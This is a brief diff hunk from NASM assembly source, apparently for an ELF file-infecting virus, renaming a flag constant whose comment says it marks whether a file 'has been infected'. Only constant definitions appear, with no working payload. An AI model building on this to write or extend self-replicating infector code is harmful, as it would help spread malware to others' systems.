@@ -102,7 +102,7 @@ endstruc
 %define PF_R 0x4
 %define PF_W 0x2
 ; used to check if the file has been infected
-%define PF_WAR 0x8
+%define PF_DEATH 0x8
 
 ; Compression
 %define COMPRESSION_TOKEN 127
